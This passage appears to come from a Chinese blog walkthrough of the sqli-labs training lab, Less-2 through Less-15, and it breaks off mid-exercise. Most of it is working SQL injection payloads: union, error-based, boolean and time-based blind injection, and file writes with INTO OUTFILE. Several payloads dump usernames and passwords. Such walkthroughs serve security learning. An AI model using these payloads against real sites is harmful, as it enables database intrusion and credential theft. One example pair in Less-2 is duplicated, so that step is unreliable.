+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D; &#39;0&#39; union select 1,2,group_concat(user, 0x3a, password) from users -- &#39;limit 1,2;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>0x3a： 0x是十六进制标志，3a是十进制的58，是ascii中的 ‘:’ ，用以分割pasword和username。</p>
+</blockquote>
+<h3 id="Less-2-基于错误的GET单引号字符型注入">Less-2 基于错误的GET单引号字符型注入</h3>
+<h4 id="判断注入类型-v2">判断注入类型</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-2&#x2F;?id&#x3D;1%27%20and%201&#x3D;1%20--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-2&#x2F;?id&#x3D;1%27%20and%201&#x3D;1%20--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>不报错</p>
+<p>说明这里接收的<code>id</code>参数类型为 <code>int</code> 型，也就是没有 <code>'</code> 去闭合。</p>
+<p>其他步骤与Less1类似，在此不再赘述。</p>
+<h3 id="Less-3-基于错误的GET单引号变形字符型注入">Less-3 基于错误的GET单引号变形字符型注入</h3>
+<h4 id="判断注入类型-v3">判断注入类型</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-3&#x2F;?id&#x3D;1%27</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>报错信息如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>有一个括号，所以尝试闭合一下括号：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-3&#x2F;?id&#x3D;1)%20and%201&#x3D;1%20--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>正确显示信息。</p>
+<p>其他步骤与Less1类似，在此不再赘述。</p>
+<h3 id="Less-4-基于错误的GET双引号字符型注入">Less-4 基于错误的GET双引号字符型注入</h3>
+<h4 id="判断注入类型-v4">判断注入类型</h4>
+<p>先使用单引号闭合：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-3&#x2F;?id&#x3D;1%27</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>报错信息如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>尝试使用<code>&quot;&quot;)</code>闭合：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-4&#x2F;?id&#x3D;1%22)%20--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>其他步骤与Less1类似，在此不再赘述。</p>
+<h3 id="Less-5-双注入GET单引号字符型注入">Less-5 双注入GET单引号字符型注入</h3>
+<p>关于双注入的形成和理解，我单独写了另外一篇博文，可以移步<a href="https://ca0y1h.top/2019/09/17/sql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/">至此</a>。</p>
+<h4 id="爆库payload："><strong>爆库payload：</strong></h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; union select 1,count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>注意，由于有随机性，可能成功执行了语句所以不会报错，正常的显示页面（即不报错）。</p>
+<h4 id="爆列名payload"><strong>爆列名payload:</strong></h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-5&#x2F;??id&#x3D;-1&#39; union select count(*),1, concat((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1),floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="爆字段payload："><strong>爆字段payload：</strong></h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; union select 1,count(*), concat((select concat_ws(&#39;|&#39;,username,password) from users limit 1,1), floor(rand()*2))as a from information_schema.tables group by a --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>修改limit x,1 可以显示第x个用户的password和username。</p>
+<h3 id="Less-6-双注入GET双引号字符型注入">Less-6 双注入GET双引号字符型注入</h3>
+<p>双引号字符型注入，上一题的单引号改成双引号就可以了。</p>
+<h3 id="Less-7-导出文件GET字符型注入">Less-7 导出文件GET字符型注入</h3>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-219176.htm">详细题解</a></p>
+<p>这道题最开始使用单引号闭合发现会有语法错误，只能经过不断大量的尝试，最后才能确定以下查询语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>确定语法正确后，可以开始编写payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;&#x2F;tmp&#x2F;hack1.txt&quot; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="爆库payload-v2">爆库payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,database() into outfile &quot;&#x2F;tmp&#x2F;hack1.txt&quot; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="爆表payload-v2">爆表payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema &#x3D; database() into outfile &quot;&#x2F;tmp&#x2F;hack2.txt&quot; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="爆字段名payload-v2">爆字段名payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; &#39;users&#39; into outfile &quot;&#x2F;tmp&#x2F;hack3.txt&quot; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="Less-8-布尔型单引号GET盲注">Less-8 布尔型单引号GET盲注</h3>
+<h4 id="判断注入类型-v5">判断注入类型</h4>
+<p>首先尝试<code>?id=1</code>，发现可以正常回显。再使用嵌入单引号<code>?id=1'</code>，发现不能正常回显，也没有任何错误消息。只好通过盲注来验证，该注入查询返回的一定是True或False。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and 1&#x3D;1 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>对应MySQL语句是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from table_name WHERE id&#x3D;1&#39; AND 1&#x3D;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>由回显的结果可知该查询是有效的。</p>
+<p>接着下一条查询：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and 1&#x3D;0 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>对应的MySQL语句是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from table_name WHERE id&#x3D;1&#39; AND 1&#x3D;0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>同样的，数据库会对给定的情况1=0进行检查，显然该查询无效的，因此将会返回FALSE。</p>
+<p>以上即可说明该数据库是可被盲注的。</p>
+<h4 id="数据库名的长度payload">数据库名的长度payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;8 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="数据库名的值payload">数据库名的值payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (ascii(substr(database(),1,1)))&#x3D;115 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>其余依次类推，只需要改变<code>substr</code>函数的第二个参数即可。</p>
+<h4 id="表名的长度payload">表名的长度payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1)))&#x3D;5 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="表名的值payload">表名的值payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1), 1, 1)))&#x3D;117 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>其余依次类推，只需要改变<code>substr</code>函数的第二个参数即可。</p>
+<h4 id="字段名的长度payload">字段名的长度payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (length((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1)))&#x3D;8 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="字段的值payload">字段的值payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1),1,1)))&#x3D;117 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>其余依次类推，只需要改变<code>substr</code>函数的第二个参数即可。</p>
+<h3 id="Less-9-基于时间的GET单引号盲注">Less-9 基于时间的GET单引号盲注</h3>
+<p>基于时间的盲注和基于布尔类型的盲注原理上差异不大，只是在判断是否正确时，前者是看是否有明显的延迟，后者是看是否有回显。</p>
+<h4 id="判断注入类型-v6">判断注入类型</h4>
+<p>不管怎么输入，回显总是you are …，考虑时间型盲注：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and sleep(3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>发现明显延迟，说明注入成功。</p>
+<h4 id="数据库名的长度payload-v2">数据库名的长度payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;8, sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>if(exp1, exp2, exp3)</code>：如果exp1是True，则返回exp2；否则返回exp3。</p>
+</blockquote>
+<h4 id="数据库名的值payload-v2">数据库名的值payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left(database(), 8)&#x3D;&#39;security&#39;, sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="表名的值payload-v2">表名的值payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),1)&#x3D;&#39;u&#39;, sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="字段的值payload-v2">字段的值payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1), 8)&#x3D;&#39;username&#39;, sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="数据的值payload">数据的值payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left((select password from users order by id limit 0,1), 4)&#x3D;&#39;dumb&#39;, sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="Less-10-基于时间的GET双引号盲注">Less-10 基于时间的GET双引号盲注</h3>
+<p>基于时间的双引号盲注，只要把上一题Less-9的单引号改成双引号，一样的注入，不再赘述。</p>
+<h3 id="Less-11-基于错误的POST型单引号字符型注入">Less-11 基于错误的POST型单引号字符型注入</h3>
+<p>测试登录成功，有数据库的数据回显信息，那么就可以尝试使用联合查询注入：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019132444.png" alt=""></p>
+<p>再使用<code>admin'</code>判断注入点：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019133259.png" alt=""></p>
+<blockquote>
+<p>这里我们使用burpsuite抓包，发送到<code>repeater</code>模块修改POST参数。</p>
+</blockquote>
+<h4 id="方法一-单引号报错注入">方法一 单引号报错注入</h4>
+<h5 id="爆库payload-v3">爆库payload</h5>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and extractvalue(1,concat(0x7e,(select database()))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id=""><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g81agywyfyj217y0nm49d.jpg" alt=""></h5>
+<h5 id="爆表payload-v3">爆表payload</h5>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g81an6fblvj217y0nm79y.jpg" alt=""></p>
+<h5 id="爆列名payload-v2">爆列名payload</h5>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g81ardx08vj217y0nmn2w.jpg" alt=""></p>
+<h5 id="爆值payload-v2">爆值payload</h5>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and extractvalue(1, concat(0x7e, (select group_concat(username, 0x3a, password) from users))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g81awfdnq0j217y0nmjx0.jpg" alt=""></p>
+<blockquote>
+<p>记录值获取个数有限</p>
+</blockquote>
+<h4 id="方法二-使用联合查询">方法二 使用联合查询</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;0&#39; union select 1,2 --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注意<code>uname</code>值是错误的时候，才能正确显示联合查询的内容</p>
+</blockquote>
+<p>举一个🌰：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;0&#39; union select 1,database() --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>其他的payload类似。</p>
+<h3 id="Less-12-基于错误的POST型双引号字符型变形注入">Less-12 基于错误的POST型双引号字符型变形注入</h3>
+<h4 id="方法一-双引号报错注入">方法一 双引号报错注入</h4>
+<p>按照题意把Less-11中payload的单引号改为双引号应该就能注入，但是在实际操作中，发现无论是用<code>--+</code>还是<code>#</code>还是<code>0x23</code>都不能注释掉后面的内容。</p>
+<p>查看一下PHP文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$uname = <span class="string">&#x27;&quot;&#x27;</span>+$uname+<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$passwd = <span class="string">&#x27;&quot;&#x27;</span>+$passwd+<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">@$sql = <span class="string">&quot;SELECT username, password from users where username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) limit 0,1&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>构造一个能闭合而且报错的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; and extractvalue(1, concat(0x7e, (select database()))) and &quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>所以SQL查询语句就变成了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select username, password from users where username&#x3D;&quot;admin&quot; and extractvalue(1, concat(0x7e, (select database()))) and &quot;&quot; and password&#x3D;($passwd) limit 0,1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>还是在Burpsuite的repeater模块中修改POST参数：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019121640.png" alt=""></p>
+<h5 id="爆库payload-v4">爆库payload</h5>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select database()))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="爆表payload-v4">爆表payload</h5>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019122304.png" alt=""></p>
+<h5 id="爆列名payload-v3">爆列名payload</h5>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019122549.png" alt=""></p>
+<h5 id="爆值payload-v3">爆值payload</h5>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select group_concat(username, &#39;::&#39;, password) from users))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019124108.png" alt=""></p>
+<h4 id="方法二-使用联合查询-v2">方法二 使用联合查询</h4>
+<p>根据SQL查询语句可以构造一个联合查询注入的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin5&quot;) union select 1,database() --+ &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>其他的payload替换查询语句即可。</p>
+<h3 id="Less-13-POST单引号变形双注入">Less-13 POST单引号变形双注入</h3>
+<p>当输入正确信息时发现没有回显信息，所以不能用联合查询，但可以使用时间盲注。</p>
+<p>使用<code>admin' and 1=1</code>判断注入点：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019140947.png" alt=""></p>
+<p>通过报错信息可以知道需要一个<code>)</code>来闭合查询语句，在尝试<code>admin') and 1=1 and ('</code>：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019141948.png" alt=""></p>
+<p>可以发现数据库不报错，SQL语句可以正常执行。由此，我们可以使用报错注入。</p>
+<h4 id="方法一-报错注入">方法一 报错注入</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;) and extractvalue(1, concat(0x7e, (select database()))) and (&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在concat()中构造查询语句，和less-12以及之前的报错型注入一样，不再赘述。</p>
+<h4 id="方法二-时间盲注">方法二 时间盲注</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;) and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(3),1) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="Less-14-POST单引号双注入">Less-14 POST单引号双注入</h3>
+<p>先尝试使用<code>admin&quot;) and 1=1 (&quot;</code>：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019143648.png" alt=""></p>
+<p>通过报错信息可以看出， 输入内容被放到双引号中 ，再次尝试`admin&quot; and 1=1#：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019144616.png" alt=""></p>
+<p>而使用<code>admin&quot; and 1=2#</code>发现登录失败。</p>
+<h4 id="方法一-报错注入-v2">方法一 报错注入</h4>
+<p>使用<code>extracvalue</code>函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and extractvalue(1,concat(0x7e,(select database()))) # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>使用<code>floor</code>函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D; &quot; union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="方法二-时间盲注-v2">方法二 时间盲注</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(3),1) --+ &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="Less-15-基于布尔型或时间延迟单引号POST型注入">Less-15 基于布尔型或时间延迟单引号POST型注入</h3>
+<p>无论怎么输入都没有回显—&gt;时间延迟注入。</p>
+<p>延迟测试payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and sleep(5) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>页面延迟明显，确定使用时间盲注：</p>
